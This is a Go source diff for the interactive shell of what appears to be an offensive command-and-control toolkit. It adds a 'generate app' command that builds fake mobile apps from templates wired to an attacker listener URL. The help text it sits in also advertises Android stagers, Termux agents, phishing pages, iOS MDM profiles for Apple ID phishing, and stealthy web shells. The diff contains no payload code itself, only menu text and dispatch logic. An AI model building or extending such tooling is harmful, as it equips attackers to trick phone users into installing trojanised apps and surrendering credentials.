@@ -649,6 +649,8 @@ func (sh *Shell) cmdGenerate(args []string) {
 	fmt.Printf("  %sMobile Payloads:%s\n", colorYellow, colorReset)
 	fmt.Printf("    %s%-35s%s %s%s%s\n", colorCyan, "generate android [listener_url]", colorReset, colorDim, "Android stager + Termux agent + phishing page", colorReset)
 	fmt.Printf("    %s%-35s%s %s%s%s\n", colorCyan, "generate ios [listener_url]", colorReset, colorDim, "iOS MDM profile + Shortcut + Apple ID phishing", colorReset)
+	fmt.Printf("    %s%-35s%s %s%s%s\n", colorCyan, "generate app <template> [url]", colorReset, colorDim, "Build fake mobile app (30+ templates)", colorReset)
+	fmt.Printf("    %s%-35s%s %s%s%s\n", colorCyan, "generate app list", colorReset, colorDim, "Show all available app templates", colorReset)
 	fmt.Println()
 
 	fmt.Printf("  %sWeb Shells (stealthy, token-protected):%s\n", colorYellow, colorReset)
@@ -698,6 +700,28 @@ func (sh *Shell) cmdGenerate(args []string) {
 			Error("Failed: %v", err)
 		} else {
 			Success("iOS payloads generated:")
+			fmt.Print(output)
+		}
+		return
+	case "app":
+		if len(args) < 2 {
+			fmt.Print(payloads.ListAppTemplates())
+			return
+		}
+		templateName := args[1]
+		if templateName == "list" {
+			fmt.Print(payloads.ListAppTemplates())
+			return
+		}
+		appURL := listenerURL
+		if len(args) > 2 {
+			appURL = args[2]
+		}
+		output, err := payloads.BuildMobileApp(templateName, appURL, "build/payloads/apps")
+		if err != nil {
+			Error("%v", err)
+		} else {
+			Success("Mobile app generated:")
 			fmt.Print(output)
 		}
 		return
